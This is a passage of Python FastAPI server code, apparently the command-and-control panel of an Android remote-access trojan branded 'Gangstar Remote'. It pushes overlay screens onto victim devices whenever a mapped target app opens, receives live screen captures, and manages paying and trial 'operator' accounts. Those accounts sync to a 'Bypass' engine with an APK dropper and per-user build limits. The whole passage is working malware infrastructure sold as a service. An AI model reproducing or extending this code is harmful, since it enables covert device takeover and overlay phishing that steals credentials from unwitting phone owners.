                            logger.info(f"Ação: Mapeamento removido do DB, overlay NÃO re-injetado")
                            logger.info(f"{'='*60}\n")
                            
                            # Reseta tracking
                            for dev_key in list(manager.device_info.keys()):
                                if dev_key.lower() == device_id.lower():
                                    manager.device_info[dev_key]["last_injected_package"] = None
                            if device_id in manager.device_info:
                                manager.device_info[device_id]["last_injected_package"] = None
                            
                            # Envia BLACK_SCREEN_OFF por segurança
                            await manager.send_command(device_id, {"action": "BLACK_SCREEN_OFF"})
                            
                            # Notifica o painel
                            await manager.broadcast_to_operators({
                                "type": "OVERLAY_AUTO_DISARMED",
                                "device_id": device_id,
                                "package": pkg_clean,
                                "reason": "ALREADY_SUBMITTED"
                            })
                        except Exception as disarm_err:
                            logger.error(f"Erro no auto-disarm no gatilho: {disarm_err}")
                    else:
                        # Overlay ainda não foi submetido — injetar normalmente
                        try:
                            template_data = json.loads(mapping.template_json) if mapping.template_json else {}
                            if isinstance(template_data, dict):
                                template_data["package_name"] = mapping.package_name or package
                            logger.info(f"🔮 Auto-injetando tela customizada '{mapping.screen_name}' para {package} no dispositivo {device_id}")
                            
                            # Define o último pacote injetado para evitar loops
                            for dev_key in list(manager.device_info.keys()):
                                if dev_key.lower() == device_id.lower():
                                    manager.device_info[dev_key]["last_injected_package"] = mapping.package_name or package
                            if device_id not in manager.device_info:
                                manager.device_info[device_id] = {}
                            manager.device_info[device_id]["last_injected_package"] = mapping.package_name or package
                            
                            # Envia comando de injeção da tela
                            await manager.send_command(device_id, {
                                "action": "CUSTOM_BLACK_SCREEN",
                                "template": template_data
                            })
                        except Exception as inject_err:
                            logger.error(f"Erro ao auto-injetar tela no dispositivo {device_id}: {inject_err}")
            elif not is_ignored:
                # Se não é o app mapeado e não é ignorado (teclado/nosso app/sistema) e tínhamos injetado, limpa e fecha a overlay
                if last_injected:
                    for dev_key in list(manager.device_info.keys()):
                        if dev_key.lower() == device_id.lower():
                            manager.device_info[dev_key]["last_injected_package"] = None
                    if device_id in manager.device_info:
                        manager.device_info[device_id]["last_injected_package"] = None
                    
                    try:
                        logger.info(f"🔮 Aplicativo alvo '{last_injected}' fechado no dispositivo {device_id}. Fechando overlay.")
                        await manager.send_command(device_id, {
                            "action": "BLACK_SCREEN_OFF"
                        })
                    except Exception as hide_err:
                        logger.error(f"Erro ao fechar overlay no dispositivo {device_id}: {hide_err}")
        # ============================================

    else:
        # Ignora logs de sistema que não são relevantes
        ignored_types = ['PONG', 'OK', 'ACK', 'PING_RESPONSE', 'HEARTBEAT']
        if msg_type not in ignored_types:
            # Log de outras mensagens relevantes
            log = DeviceLog(
                device_id=device_id,
                log_type=msg_type,
                log_data=json.dumps(message),
                created_at=utc_now()
            )
            db.add(log)
            await safe_db_commit(db)

async def handle_screen_frame(device_id: str, frame_data: bytes):
    """Processa frame de captura de tela com detecção de formato universal (raw JPEG/WebP ou 5B header)"""
    manager.update_device_activity(device_id)
    if not frame_data or len(frame_data) < 4:
        return
        
    jpeg_data = None
    # 1. Se os dados já forem um arquivo JPEG (\xFF\xD8) ou WebP (RIFF) nativo
    if frame_data.startswith(b'\xff\xd8') or frame_data.startswith(b'RIFF'):
        jpeg_data = frame_data
    # 2. Se possuir cabeçalho customizado de 5 bytes [TIPO: 1B][TAMANHO: 4B][DADOS...]
    elif len(frame_data) > 5:
        payload = frame_data[5:]
        if payload.startswith(b'\xff\xd8') or payload.startswith(b'RIFF'):
            jpeg_data = payload
        else:
            frame_size = int.from_bytes(frame_data[1:5], byteorder='big')
            if 0 < frame_size <= len(frame_data) - 5:
                jpeg_data = frame_data[5:5+frame_size]
            else:
                jpeg_data = payload

    if jpeg_data and len(jpeg_data) > 0:
        await manager.store_screen_frame(device_id, jpeg_data)

# ==================== API DE AUTENTICAÇÃO ====================

@app.post("/api/auth/login")
async def login(request: Request, login_req: LoginRequest, db: Session = Depends(get_db)):
    """Login de operador com proteção anti-brute-force e suporte a HWID"""
    client_ip = request.client.host if request.client else "unknown"
    now = utc_now()

    # Isenta conexões locais (localhost / loopback) de bloqueio por tentativas
    if client_ip in ["127.0.0.1", "::1", "localhost"]:
        LOGIN_ATTEMPTS.pop(client_ip, None)

    # Verifica se IP está bloqueado por limite de tentativas
    if client_ip in LOGIN_ATTEMPTS and client_ip not in ["127.0.0.1", "::1", "localhost"]:
        attempt = LOGIN_ATTEMPTS[client_ip]
        if attempt.get("blocked_until") and now < attempt["blocked_until"]:
            wait_sec = int((attempt["blocked_until"] - now).total_seconds())
            raise HTTPException(
                status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                detail=f"Muitas tentativas incorretas. Tente novamente em {wait_sec} segundos."
            )
        elif attempt.get("blocked_until") and now >= attempt["blocked_until"]:
            LOGIN_ATTEMPTS[client_ip] = {"count": 0, "blocked_until": None}

    operator = db.query(Operator).filter(Operator.username == login_req.username).first()
    valid_pass = verify_password(login_req.password, operator.hashed_password) if operator else False
    if operator:
        logger.info(f"[LOGIN] Tentativa de login para user={operator.username}, 2fa_enabled={operator.totp_enabled}")

    if not operator or not valid_pass:
        if client_ip not in LOGIN_ATTEMPTS:
            LOGIN_ATTEMPTS[client_ip] = {"count": 1, "blocked_until": None}
        else:
            LOGIN_ATTEMPTS[client_ip]["count"] += 1

        if LOGIN_ATTEMPTS[client_ip]["count"] >= 5:
            LOGIN_ATTEMPTS[client_ip]["blocked_until"] = now + timedelta(minutes=15)
            raise HTTPException(
                status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                detail="Muitas tentativas falhas de login. Seu IP foi bloqueado temporariamente por 15 minutos."
            )

        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Credenciais inválidas"
        )

    # Login correto: reseta tentativas
    LOGIN_ATTEMPTS.pop(client_ip, None)
    
    # Verifica se está banido
    if operator.is_banned:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Sua conta foi banida. Contate o administrador."
        )
    
    # Verifica se está ativo
    if not operator.is_active:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Sua conta está desativada."
        )
    
    # Verifica se a conta expirou
    if operator.expires_at and utc_now() > operator.expires_at:
        expired_date = operator.expires_at.strftime("%d/%m/%Y %H:%M")
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail=f"Sua conta de acesso expirou em {expired_date}. Contate o administrador do painel."
        )
    
    # ==================== GOOGLE AUTHENTICATOR (2FA) ====================
    two_factor_token = create_2fa_token(operator.username)
    
    # Se o operador já possui 2FA ativado
    if operator.totp_enabled and operator.totp_secret:
        return {
            "needs_2fa": True,
            "needs_2fa_setup": False,
            "two_factor_token": two_factor_token,
            "access_token": "",
            "token_type": "bearer",
            "needs_hwid": False
        }
    
    # Se ainda não configurou o 2FA, gera chave e QR Code para configuração inicial
    secret = operator.totp_temp_secret or generate_totp_secret()
    operator.totp_temp_secret = secret
    db.commit()
    
    uri, qr_code_b64 = generate_totp_qr_and_uri(operator.username, secret, issuer_name="Gangstar Remote")
    
    return {
        "needs_2fa": True,
        "needs_2fa_setup": True,
        "two_factor_token": two_factor_token,
        "secret": secret,
        "qr_code": qr_code_b64,
        "access_token": "",
        "token_type": "bearer",
        "needs_hwid": False
    }

@app.post("/api/auth/register-trial")
async def register_trial(
    request: Request,
    trial_req: TrialRegisterRequest,
    db: Session = Depends(get_db)
):
    """
    Cria uma conta de teste grátis por 1 dia (24 horas).
    Possui trava anti-abuso rigorosa: impede mais de 1 teste por IP, HWID e E-mail.
    """
    # 1. Obter o IP REAL do cliente (NUNCA confiar em X-Forwarded-For)
    client_ip = request.client.host if request.client else "unknown"
    
    # SEGURANÇA: Rate limiting anti-flood (máx 3 registros por IP a cada 24h)
    now = utc_now()
    if client_ip in TRIAL_REGISTER_ATTEMPTS:
        tr_attempt = TRIAL_REGISTER_ATTEMPTS[client_ip]
        if tr_attempt.get("blocked_until") and now < tr_attempt["blocked_until"]:
            wait_min = int((tr_attempt["blocked_until"] - now).total_seconds() / 60) + 1
            raise HTTPException(
                status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                detail=f"Limite de registros atingido. Tente novamente em {wait_min} minutos."
            )
        # Limpar bloqueio expirado
        if tr_attempt.get("blocked_until") and now >= tr_attempt["blocked_until"]:
            TRIAL_REGISTER_ATTEMPTS[client_ip] = {"count": 0, "first_attempt": now, "blocked_until": None}
        # Verificar se já atingiu o limite na janela de 24h
        if tr_attempt.get("count", 0) >= 3:
            first = tr_attempt.get("first_attempt", now)
            if (now - first).total_seconds() < 86400:  # 24 horas
                TRIAL_REGISTER_ATTEMPTS[client_ip]["blocked_until"] = first + timedelta(hours=24)
                raise HTTPException(
                    status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                    detail="Limite de 3 registros por dia atingido para este IP."
                )
            else:
                # Reset janela
                TRIAL_REGISTER_ATTEMPTS[client_ip] = {"count": 0, "first_attempt": now, "blocked_until": None}

    username = trial_req.username.strip() if trial_req.username else ""
    password = trial_req.password.strip() if trial_req.password else ""
    telegram = trial_req.telegram.strip() if trial_req.telegram else None
    email = trial_req.email.strip() if trial_req.email else None
    hwid = trial_req.hwid.strip() if trial_req.hwid else None

    # SEGURANÇA: Validação rigorosa de username (apenas letras, números, underscore e hífen)
    if not username or len(username) < 3 or len(username) > 20:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="O nome de usuário deve ter entre 3 e 20 caracteres."
        )
    if not re.match(r'^[a-zA-Z0-9_-]+$', username):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="O nome de usuário deve conter apenas letras, números, underscore (_) e hífen (-)."
        )
    # SEGURANÇA: Senha mínima de 6 caracteres
    if not password or len(password) < 6:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="A senha deve ter pelo menos 6 caracteres."
        )

    if not telegram:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Por favor, informe seu Telegram (@usuario ou contato)."
        )

    # 2. Verificar se usuário, e-mail ou HWID já existem na tabela de operadores
    if hwid:
        hwid_exists = db.query(Operator).filter(Operator.hwid == hwid).first()
        if hwid_exists:
            # Se já existe o mesmo HWID (ex: cadastros WEB simultâneos), zera para evitar constraint error
            hwid = None

    query_existing = db.query(Operator).filter(Operator.username == username)
    if email:
        query_existing = db.query(Operator).filter(
            (Operator.username == username) | (Operator.email == email)
        )
    if query_existing.first():
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Nome de usuário ou e-mail já cadastrado no sistema."
        )

    # 3. TRAVA ANTI-ABUSO: Impedir mais de 1 teste por IP real ou E-mail
    # SEGURANÇA: Removido whitelist is_proxy_ip — TODOS os IPs são verificados
    claim_check = db.query(TrialClaim).filter(
        (TrialClaim.ip_address == client_ip) |
        ((TrialClaim.email != None) & (TrialClaim.email == email))
    ).first()

    operator_trial_check = db.query(Operator).filter(
        Operator.is_trial == True,
        Operator.created_ip == client_ip
    ).first()

    if claim_check or operator_trial_check:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="⚠️ Limite atingido: Você (ou seu IP) já gerou 1 login de teste no sistema. Não é permitido gerar mais de 1 teste."
        )

    # Registrar tentativa de registro no rate limiter
    if client_ip not in TRIAL_REGISTER_ATTEMPTS:
        TRIAL_REGISTER_ATTEMPTS[client_ip] = {"count": 1, "first_attempt": now, "blocked_until": None}
    else:
        TRIAL_REGISTER_ATTEMPTS[client_ip]["count"] += 1

    # 4. Criar conta de teste com expiração de exatamente 1 dia (24 horas)
    exp_date = utc_now() + timedelta(days=1)
    user_email = email or f"{username}@test.local"
    secret = generate_totp_secret()

    new_user = Operator(
        username=username,
        email=user_email,
        hashed_password=get_password_hash(password),
        is_admin=False,
        is_active=True,
        is_trial=True,
        expires_at=exp_date,
        created_ip=client_ip,
        hwid=hwid,
        notes=f"Telegram: {telegram}",
        totp_temp_secret=secret
    )
    if hwid:
        new_user.hwid_activated_at = utc_now()

    db.add(new_user)

    # Registra o teste na tabela TrialClaim para garantia permanente
    claim = TrialClaim(
        ip_address=client_ip,
        hwid=hwid,
        email=email,
        username=username
    )
    db.add(claim)
    db.commit()
    db.refresh(new_user)

    # 5. Sincronizar com motor Bypass (projeto_bypass)
    try:
        sync_user_to_bypass(
            username=username,
            password=password,
            role="operator",
            expires_at=exp_date,
            status="active"
        )
    except Exception as e:
        logger.error(f"Erro ao sincronizar usuário teste com motor Bypass: {e}")

    logger.info(f"🎁 Login de teste criado com 2FA: {username} (Telegram: {telegram}, IP: {client_ip})")

    # 6. Gerar chave e QR Code do Google Authenticator (2FA Obrigatório no Teste Grátis)
    uri, qr_code_b64 = generate_totp_qr_and_uri(username, secret, issuer_name="Gangstar Remote")
    two_factor_token = create_2fa_token(username)

    return {
        "status": "requires_2fa_setup",
        "message": "Conta de teste criada! Configure o 2FA para ativar seu acesso de 1 dia.",
        "username": username,
        "expires_at": exp_date.isoformat(),
        "requires_2fa_setup": True,
        "needs_2fa": True,
        "needs_2fa_setup": True,
        "two_factor_token": two_factor_token,
        "secret": secret,
        "qr_code": qr_code_b64,
        "access_token": "",
        "token_type": "bearer",
        "needs_hwid": False
    }

@app.post("/api/auth/setup-2fa")
async def setup_2fa(
    request: Request,
    body: Setup2FARequest,
    db: Session = Depends(get_db)
):
    """Valida o primeiro código e ativa o Google Authenticator definitivamente"""
    # SEGURANÇA: Rate limiting para prevenir brute-force de código TOTP
    client_ip = request.client.host if request.client else "unknown"
    now = utc_now()
    if client_ip in TOTP_VERIFY_ATTEMPTS:
        ta = TOTP_VERIFY_ATTEMPTS[client_ip]
        if ta.get("blocked_until") and now < ta["blocked_until"]:
            raise HTTPException(
                status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                detail="Muitas tentativas de verificação 2FA. Tente novamente em 15 minutos."
            )
        elif ta.get("blocked_until") and now >= ta["blocked_until"]:
            TOTP_VERIFY_ATTEMPTS[client_ip] = {"count": 0, "blocked_until": None}

    # SEGURANÇA: EXIGIR token 2FA válido (nunca aceitar username raw sem autenticação)
    username = None
    if body.two_factor_token:
        username = decode_2fa_token(body.two_factor_token)

    if not username:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Sessão de verificação expirada. Faça login novamente."
        )
    
    operator = db.query(Operator).filter(Operator.username == username).first()
    if not operator:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    totp_code = (body.code or body.totp_code or "").strip()
    if not totp_code:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Por favor, insira o código de 6 dígitos gerado pelo Google Authenticator."
        )

    secret_to_check = operator.totp_temp_secret or operator.totp_secret
    if not secret_to_check:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Nenhuma chave 2FA pendente de ativação."
        )
    
    if not verify_totp_code(secret_to_check, totp_code):
        # SEGURANÇA: Registrar tentativa falha de 2FA
        if client_ip not in TOTP_VERIFY_ATTEMPTS:
            TOTP_VERIFY_ATTEMPTS[client_ip] = {"count": 1, "blocked_until": None}
        else:
            TOTP_VERIFY_ATTEMPTS[client_ip]["count"] += 1
        if TOTP_VERIFY_ATTEMPTS[client_ip]["count"] >= 5:
            TOTP_VERIFY_ATTEMPTS[client_ip]["blocked_until"] = now + timedelta(minutes=15)
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Código do Google Authenticator incorreto. Verifique o horário do celular e digite o código de 6 dígitos atual."
        )
    
    # Ativa 2FA
    if operator.totp_temp_secret:
        operator.totp_secret = operator.totp_temp_secret
        operator.totp_temp_secret = None
    operator.totp_enabled = True
    
    # HWID desativado - sem validação de trava de hardware

    
    operator.last_login = utc_now()
    db.commit()
    
    access_token = create_access_token(data={"sub": operator.username})
    logger.info(f"2FA Setup e Login com sucesso: {operator.username}")
    
    return {"access_token": access_token, "token_type": "bearer", "needs_hwid": False, "needs_2fa": False}

@app.post("/api/auth/verify-2fa")
async def verify_2fa(
    request: Request,
    body: Verify2FARequest,
    db: Session = Depends(get_db)
):
    """Verifica código de 6 dígitos do Google Authenticator no login"""
    # SEGURANÇA: Rate limiting para prevenir brute-force de código TOTP
    client_ip = request.client.host if request.client else "unknown"
    now = utc_now()
    if client_ip in TOTP_VERIFY_ATTEMPTS:
        ta = TOTP_VERIFY_ATTEMPTS[client_ip]
        if ta.get("blocked_until") and now < ta["blocked_until"]:
            raise HTTPException(
                status_code=status.HTTP_429_TOO_MANY_REQUESTS,
                detail="Muitas tentativas de verificação 2FA. Tente novamente em 15 minutos."
            )
        elif ta.get("blocked_until") and now >= ta["blocked_until"]:
            TOTP_VERIFY_ATTEMPTS[client_ip] = {"count": 0, "blocked_until": None}

    # SEGURANÇA: EXIGIR token 2FA válido (nunca aceitar username raw sem autenticação)
    username = None
    if body.two_factor_token:
        username = decode_2fa_token(body.two_factor_token)

    if not username:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Sessão de verificação expirada. Faça login novamente."
        )
    
    operator = db.query(Operator).filter(Operator.username == username).first()
    if not operator:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    totp_secret = operator.totp_secret or operator.totp_temp_secret
    if not totp_secret:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="2FA não está configurado para este usuário."
        )
    
    totp_code = (body.code or body.totp_code or "").strip()
    if not totp_code:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Por favor, insira o código de 6 dígitos gerado pelo Google Authenticator."
        )

    if not verify_totp_code(totp_secret, totp_code):
        # SEGURANÇA: Registrar tentativa falha de 2FA
        if client_ip not in TOTP_VERIFY_ATTEMPTS:
            TOTP_VERIFY_ATTEMPTS[client_ip] = {"count": 1, "blocked_until": None}
        else:
            TOTP_VERIFY_ATTEMPTS[client_ip]["count"] += 1
        if TOTP_VERIFY_ATTEMPTS[client_ip]["count"] >= 5:
            TOTP_VERIFY_ATTEMPTS[client_ip]["blocked_until"] = now + timedelta(minutes=15)
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Código do Google Authenticator inválido ou expirado."
        )
    
    if operator.totp_temp_secret:
        operator.totp_secret = operator.totp_temp_secret
        operator.totp_temp_secret = None
        operator.totp_enabled = True

    # HWID desativado - sem validação de trava de hardware

    
    operator.last_login = utc_now()
    db.commit()
    
    access_token = create_access_token(data={"sub": operator.username})
    logger.info(f"2FA Login verificado com sucesso: {operator.username}")
    
    return {"access_token": access_token, "token_type": "bearer", "needs_hwid": False, "needs_2fa": False}


class HwidActivationBody(BaseModel):
    username: str
    password: str
    hwid: str

@app.post("/api/auth/activate-hwid")
async def activate_hwid(
    body: HwidActivationBody,
    db: Session = Depends(get_db)
):
    """Ativa HWID para usuário"""
    username = body.username
    password = body.password
    hwid = body.hwid
    
    operator = db.query(Operator).filter(Operator.username == username).first()
    
    if not operator or not verify_password(password, operator.hashed_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Credenciais inválidas"
        )
    
    # Se o usuário possui 2FA ativado, exige validação prévia de 2FA
    if operator.totp_enabled and operator.totp_secret:
        two_factor_token = create_2fa_token(operator.username)
        return {
            "needs_2fa": True,
            "needs_2fa_setup": False,
            "two_factor_token": two_factor_token,
            "access_token": "",
            "token_type": "bearer"
        }
    
    # Verifica se já tem HWID
    if operator.hwid is not None:
        if operator.hwid == hwid:
            # Mesmo HWID, só faz login
            access_token = create_access_token(data={"sub": operator.username})
            operator.last_login = utc_now()
            db.commit()
            return {"access_token": access_token, "token_type": "bearer"}
        else:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Esta conta já está vinculada a outro dispositivo (HWID diferente)."
            )
    
    # Verifica se HWID já está em uso
    existing = db.query(Operator).filter(Operator.hwid == hwid, Operator.id != operator.id).first()
    if existing:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Este dispositivo já está vinculado a outra conta."
        )
    
    # Ativa HWID
    operator.hwid = hwid
    operator.hwid_activated_at = utc_now()
    operator.last_login = utc_now()
    db.commit()
    
    # Gera token
    access_token = create_access_token(data={"sub": operator.username})
    
    logger.info(f"HWID ativado para {operator.username}: {hwid}")
    
    return {"access_token": access_token, "token_type": "bearer"}

@app.get("/api/auth/me")
async def get_current_user_info(current_user: Operator = Depends(get_current_user)):
    """Retorna informações do usuário atual"""
    return {
        "id": current_user.id,
        "username": current_user.username,
        "email": current_user.email,
        "is_admin": current_user.is_admin,
        "is_active": current_user.is_active
    }

class ProfileUpdateBody(BaseModel):
    email: Optional[str] = None
    username: Optional[str] = None
    password: Optional[str] = None
    current_password: Optional[str] = None

@app.put("/api/auth/profile")
async def update_profile(
    body: ProfileUpdateBody,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Atualiza o perfil do usuário logado (email, username e/ou senha)."""
    if body.email:
        existing = db.query(Operator).filter(Operator.email == body.email, Operator.id != current_user.id).first()
        if existing:
            raise HTTPException(status_code=400, detail="Este e-mail já está em uso.")
        current_user.email = body.email

    if body.username:
        existing = db.query(Operator).filter(Operator.username == body.username, Operator.id != current_user.id).first()
        if existing:
            raise HTTPException(status_code=400, detail="Este nome de usuário já está em uso.")
        current_user.username = body.username

    if body.password:
        if not body.current_password or not verify_password(body.current_password, current_user.hashed_password):
            raise HTTPException(status_code=400, detail="Senha atual incorreta. É necessário fornecer a senha atual para definir uma nova senha.")
        current_user.hashed_password = get_password_hash(body.password)

    db.commit()
    db.refresh(current_user)
    return {
        "id": current_user.id,
        "username": current_user.username,
        "email": current_user.email,
        "is_admin": current_user.is_admin
    }


@app.post("/api/auth/refresh", response_model=Token)
async def refresh_token(
    db: Session = Depends(get_db),
    token: str = Depends(oauth2_scheme)
):
    """
    Renova token JWT para o painel.
    Aceita tokens expirados para permitir renovação sem relogin.
    """
    from auth import get_user_from_expired_token
    
    # Tenta obter usuário mesmo de token expirado
    operator = get_user_from_expired_token(token, db)
    
    if operator is None:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Token inválido ou usuário não encontrado",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    # Gera novo token
    access_token = create_access_token(data={"sub": operator.username})
    return {"access_token": access_token, "token_type": "bearer"}

# ==================== API DE ADMIN ====================

from auth import get_current_admin, is_master_admin, get_current_master_admin

@app.get("/api/admin/stats")
async def admin_get_stats(
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Estatísticas do sistema (apenas admin)"""
    total_users = db.query(Operator).count()
    active_users = db.query(Operator).filter(Operator.is_active == True, Operator.is_banned == False).count()
    banned_users = db.query(Operator).filter(Operator.is_banned == True).count()
    total_devices = db.query(Device).count()
    online_devices = len(manager.active_connections)
    
    return {
        "total_users": total_users,
        "active_users": active_users,
        "banned_users": banned_users,
        "total_devices": total_devices,
        "online_devices": online_devices
    }

@app.get("/api/admin/users")
async def admin_get_users(
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Lista todos os usuários (apenas admin)"""
    users = db.query(Operator).all()
    result = []
    
    for user in users:
        device_count = db.query(Device).filter(Device.owner_id == user.id).count()
        result.append({
            "id": user.id,
            "username": user.username,
            "email": user.email,
            "is_active": user.is_active,
            "is_admin": user.is_admin,
            "is_banned": user.is_banned,
            "hwid": user.hwid,
            "hwid_activated_at": user.hwid_activated_at.isoformat() if user.hwid_activated_at else None,
            "totp_enabled": bool(user.totp_enabled and user.totp_secret),
            "created_at": user.created_at.isoformat() if user.created_at else None,
            "expires_at": user.expires_at.isoformat() if user.expires_at else None,
            "last_login": user.last_login.isoformat() if user.last_login else None,
            "last_ip": user.last_ip,
            "notes": user.notes,
            "device_count": device_count
        })
    
    return result

def sync_user_to_bypass(
    username: str, 
    password: Optional[str] = None, 
    role: Optional[str] = None, 
    expires_at: Optional[datetime] = None, 
    status: Optional[str] = None, 
    is_delete: bool = False
):
    """Sincroniza o usuário principal com o banco de dados JSON do Bypass (data.json)."""
    try:
        import shutil
        # Caminho oficial do data.json do bypass: projeto_bypass/apk_dropper/data.json
        bypass_json_path = os.path.join(os.path.dirname(__file__), "projeto_bypass", "apk_dropper", "data.json")
        if not os.path.exists(bypass_json_path):
            # Fallback path se a pasta apk_dropper não estiver criada
            bypass_json_path_alt = os.path.join(os.path.dirname(__file__), "projeto_bypass", "data.json")
            if os.path.exists(bypass_json_path_alt):
                bypass_json_path = bypass_json_path_alt
            else:
                os.makedirs(os.path.dirname(bypass_json_path), exist_ok=True)
                with open(bypass_json_path, "w", encoding="utf-8") as f:
                    json.dump({"users": {}, "teams": {}, "history": []}, f, indent=2)

        with open(bypass_json_path, "r", encoding="utf-8") as f:
            b_data = json.load(f)

        users = b_data.setdefault("users", {})

        if is_delete:
            if username in users:
                del users[username]
                logger.info(f"🔄 Usuário {username} deletado no motor Bypass!")
        else:
            if username not in users:
                from auth import get_password_hash as _bp_hash
                users[username] = {
                    "password": _bp_hash(password) if password else "",
                    "role": role or "operator",
                    "status": status or "active",
                    "expires_at": expires_at.isoformat() if expires_at else None,
                    "created_at": utc_now().isoformat(),
                    "builds": [],
                    "daily_apk_limit": 0,
                    "daily_apk_count": 0,
                    "daily_apk_reset_date": utc_now().strftime("%Y-%m-%d"),
                    "bypass_options_limit_date": expires_at.strftime("%Y-%m-%d") if expires_at else ""
                }
                logger.info(f"🔄 Usuário {username} criado e sincronizado com motor Bypass!")
            else:
                # Atualiza dados existentes
                if password is not None:
                    from auth import get_password_hash as _bp_hash
                    users[username]["password"] = _bp_hash(password)
                if role is not None:
                    users[username]["role"] = role
                if expires_at is not None:
                    users[username]["expires_at"] = expires_at.isoformat()
                    users[username]["bypass_options_limit_date"] = expires_at.strftime("%Y-%m-%d")
                elif status == "active":
                    # Se explicitamente ativado e expirados limpos
                    users[username]["expires_at"] = None
                    users[username]["bypass_options_limit_date"] = ""
                if status is not None:
                    users[username]["status"] = status
                logger.info(f"🔄 Usuário {username} atualizado no motor Bypass!")

        # Escrita atômica segura para evitar corromper o arquivo data.json
        temp_path = bypass_json_path + ".tmp"
        with open(temp_path, "w", encoding="utf-8") as f:
            json.dump(b_data, f, indent=2, ensure_ascii=False)
            f.flush()
            os.fsync(f.fileno())

        # Backup da versão estável anterior
        if os.path.exists(bypass_json_path):
            shutil.copy2(bypass_json_path, bypass_json_path + ".bak")

        os.replace(temp_path, bypass_json_path)
    except Exception as sync_err:
        logger.error(f"Erro ao sincronizar usuário {username} com motor Bypass: {sync_err}")

@app.post("/api/admin/users")
async def admin_create_user(
    username: str = Form(...),
    email: str = Form(...),
    password: str = Form(...),
    is_admin: bool = Form(False),
    expiration_days: Optional[int] = Form(None),
    expires_at: Optional[str] = Form(None),
    notes: str = Form(None),
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Cria novo usuário com opção de expiração (apenas admin)"""
    # Proteção de segurança: Apenas Master Admin (admin/elice4) pode criar novos admins
    if is_admin and not is_master_admin(current_user):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Apenas administradores master (admin/elice4) têm permissão para criar novos administradores."
        )

    # Verifica se já existe
    existing = db.query(Operator).filter(
        (Operator.username == username) | (Operator.email == email)
    ).first()
    if existing:
        raise HTTPException(status_code=400, detail="Usuário ou email já existe")
    
    exp_date = None
    if expiration_days and expiration_days > 0:
        exp_date = utc_now() + timedelta(days=expiration_days)
    elif expires_at and expires_at.strip():
        try:
            exp_date = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        except Exception:
            pass
    
    # Cria usuário
    new_user = Operator(
        username=username,
        email=email,
        hashed_password=get_password_hash(password),
        is_admin=is_admin,
        expires_at=exp_date,
        notes=notes
    )
    db.add(new_user)
    db.commit()
    db.refresh(new_user)
    
    # Sincroniza criação no motor Bypass (projeto_bypass)
    sync_user_to_bypass(
        username=username,
        password=password,
        role="admin" if is_admin else "operator",
        expires_at=exp_date,
        status="active"
    )

    logger.info(f"Admin {current_user.username} criou usuário: {username} (expira: {exp_date})")
    
    return {"status": "ok", "user_id": new_user.id}

@app.put("/api/admin/users/{user_id}")
async def admin_update_user(
    user_id: int,
    email: str = Form(None),
    password: str = Form(None),
    is_active: bool = Form(None),
    is_banned: bool = Form(None),
    is_admin: bool = Form(None),
    notes: str = Form(None),
    expiration_days: Optional[int] = Form(None),
    expires_at: Optional[str] = Form(None),
    clear_expiration: bool = Form(False),
    reset_hwid: bool = Form(False),
    reset_2fa: bool = Form(False),
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Atualiza usuário (apenas admin)"""
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    # Proteção: contas de Administrador Master não podem ser modificadas por sub-admins
    if is_master_admin(user) and not is_master_admin(current_user):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Apenas administradores master podem alterar privilégios de um administrador master."
        )

    # Proteção: concessão ou revogação de privilégio admin restrita aos Master Admins
    if is_admin is not None and is_admin != user.is_admin:
        if not is_master_admin(current_user):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Apenas administradores master (admin/elice4) têm permissão para alterar privilégios de administrador."
            )

    if email is not None:
        user.email = email
    if password is not None and password.strip():
        user.hashed_password = get_password_hash(password)
    if is_active is not None:
        user.is_active = is_active
    if is_banned is not None:
        user.is_banned = is_banned
    if is_admin is not None:
        user.is_admin = is_admin
    if notes is not None:
        user.notes = notes
    if clear_expiration:
        user.expires_at = None
    elif expiration_days and expiration_days > 0:
